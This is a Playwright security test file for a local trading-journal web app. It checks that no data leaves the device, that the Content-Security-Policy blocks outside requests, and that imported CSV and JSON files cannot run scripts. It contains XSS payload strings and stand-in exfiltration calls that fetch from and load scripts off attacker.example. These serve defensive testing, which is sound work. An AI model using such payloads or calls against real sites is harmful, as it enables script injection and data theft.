import { expect, test } from '@playwright/test';
import { mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { addEntry, createAccount, freshApp, gotoTab } from './helpers';
import { canonicalDigest } from '../../src/lib/digest';

const PAYLOADS = ['<img src=x onerror="window.__pwned=1">', '<script>window.__pwned=1</script>', '"><svg onload=window.__pwned=1>'];

test.beforeEach(async ({ page }) => {
  await page.addInitScript(() => {
    const w = window as unknown as { __csp: string[] };
    w.__csp = [];
    document.addEventListener('securitypolicyviolation', (e) => w.__csp.push(`${e.violatedDirective} ${e.blockedURI}`));
  });
});

test('private data never leaves the device: only same-origin requests, no console output with data', async ({ page, baseURL }) => {
  const requests: string[] = [];
  const consoleText: string[] = [];
  page.on('request', (r) => requests.push(r.url()));
  page.on('console', (m) => consoleText.push(m.text()));
  await freshApp(page);
  await createAccount(page, 'SecretBroker', '12345.67');
  await addEntry(page, { amount: '987.65', symbol: 'SECRETSYM', tag: 'secret-tag' });
  for (const tab of ['calendar', 'trades', 'analytics', 'accounts'] as const) await gotoTab(page, tab);
  const foreign = requests.filter((u) => !u.startsWith(baseURL!) && !u.startsWith('data:') && !u.startsWith('blob:'));
  expect(foreign).toEqual([]);
  expect(consoleText.filter((t) => /SECRET|secret-tag|987\.65|12,?345/i.test(t))).toEqual([]);
  expect(await page.evaluate(() => (window as unknown as { __csp: string[] }).__csp)).toEqual([]);
});

test('Content-Security-Policy blocks sending data to another server', async ({ page }) => {
  await freshApp(page);
  const csp = await page.locator('meta[http-equiv=Content-Security-Policy]').getAttribute('content');
  expect(csp).toContain("connect-src 'self'");
  expect(csp).toContain("script-src 'self'");
  const fetchResult = await page.evaluate(() => fetch('https://attacker.example/steal?d=1').then(() => 'sent', () => 'blocked'));
  expect(fetchResult).toBe('blocked');
  await page.evaluate(() => {
    new Image().src = 'https://attacker.example/pixel.gif';
    const s = document.createElement('script');
    s.src = 'https://attacker.example/x.js';
    document.head.appendChild(s);
  });
  await expect.poll(() => page.evaluate(() => (window as unknown as { __csp: string[] }).__csp.join('\n'))).toMatch(/img-src.*attacker\.example[\s\S]*script-src.*attacker\.example|script-src.*attacker[\s\S]*img-src.*attacker/);
});

test('XSS payloads in imported CSV and JSON are shown as plain text and never run', async ({ page }) => {
  await freshApp(page);
  await createAccount(page, 'Main', '0', '2026-01-01');
  const dir = mkdtempSync(join(tmpdir(), 'daybook-xss-'));
  const csv = ['date,account,symbol,pnl,tags,notes', ...PAYLOADS.map((p, i) => `2026-03-0${i + 1},"${p.replace(/"/g, '""')}","${p.replace(/"/g, '""')}",${i + 1},"${p.replace(/"/g, '""')}","${p.replace(/"/g, '""')}"`)].join('\n');
  writeFileSync(join(dir, 'x.csv'), csv);
  await gotoTab(page, 'accounts');
  await page.getByTestId('import-csv').click();
  await page.getByTestId('csv-file').setInputFiles(join(dir, 'x.csv'));
  await expect(page.getByTestId('csv-summary')).toContainText('3 new');
  await page.getByTestId('csv-run').click();
  await gotoTab(page, 'trades');
  await expect(page.locator('#screen-trades')).toContainText('<img src=x onerror="window.__pwned=1">');

  // JSON backup with payloads in names (valid checksum, so it is accepted and rendered)
  const now = Date.now();
  const body = {
    app: 'daybook-pnl-journal', format: 2, schemaVersion: 1, exportedAt: new Date().toISOString(),
    summary: { accounts: 1, trades: 1, cashflows: 0, netPnlCents: 100 },
    data: {
      accounts: [{ id: 'acc-x', name: PAYLOADS[2], startingBalanceCents: 0, startDate: '2026-01-01', color: '#4F8CFF', archived: false, sortOrder: 0, createdAt: now, updatedAt: now }],
      trades: [{ id: 'tr-x', accountId: 'acc-x', date: '2026-03-09', pnlCents: 100, feesCents: null, symbol: PAYLOADS[1], platform: PAYLOADS[0], tags: [PAYLOADS[0]], notes: PAYLOADS[1], side: null, quantity: null, entryPrice: null, exitPrice: null, entryTime: null, exitTime: null, createdAt: now, updatedAt: now }],
      cashflows: [], tombstones: [],
    },
    settings: { lang: null },
  };
  writeFileSync(join(dir, 'x.json'), JSON.stringify({ ...body, integrity: { algorithm: 'SHA-256', scheme: 'daybook-canonical-json-v1', digest: canonicalDigest(body) } }));
  await gotoTab(page, 'accounts');
  await page.getByTestId('restore-json').click();
  await page.getByTestId('restore-file').setInputFiles(join(dir, 'x.json'));
  await page.getByTestId('restore-mode-merge').click();
  await page.getByTestId('restore-run').click();
  await expect(page.locator('#screen-accounts')).toContainText('"><svg onload=window.__pwned=1>');
  for (const tab of ['calendar', 'trades', 'analytics'] as const) await gotoTab(page, tab);
  expect(await page.evaluate(() => (window as unknown as { __pwned?: number }).__pwned)).toBeUndefined();
  expect(await page.locator('#root img[src=x], #root svg[onload]').count()).toBe(0);
});
